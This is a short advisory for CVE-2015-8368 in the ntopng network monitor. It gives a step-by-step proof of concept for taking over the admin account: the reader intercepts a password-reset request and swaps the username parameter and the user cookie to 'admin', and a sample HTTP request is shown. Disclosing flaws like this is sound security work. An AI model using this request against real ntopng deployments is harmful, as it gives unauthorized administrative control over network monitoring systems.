# CVE-2015-8368

# Product Details:
ntopng is the next generation version of the original ntop, a network traffic probe that shows the network usage, similar to what the popular top Unix command does. ntopng is based on libpcap and it has been written in a portable way in order to virtually run on every Unix platform, MacOSX and on Windows as well.

# Vulnerability Details:
in the latest stable release of ntop-ng it is possible to escalate the privileges of a non-privileged user to the admin account by resetting the password, intercepting the request and replacing the HTTP parameters.

# Vulnerability Proof of concept
1. Login with an unprivileged account
2. Change the account password and intercept the request, modify  the username= and Cookie user= and change to the admin account
Example:
GET /lua/admin/password_reset.lua?csrf=XXXXXXXXXXXXXXXXXX&username=admin&old_password=12345&new_password=123456&confirm_new_password=123456 HTTP/1.1
Cookie: user=admin; session=XXXXXXXXXXXXXXXXXXXXXXXXX
3. Login with the admin account and the password you defined in step #3.

Voila! you're an administrator.
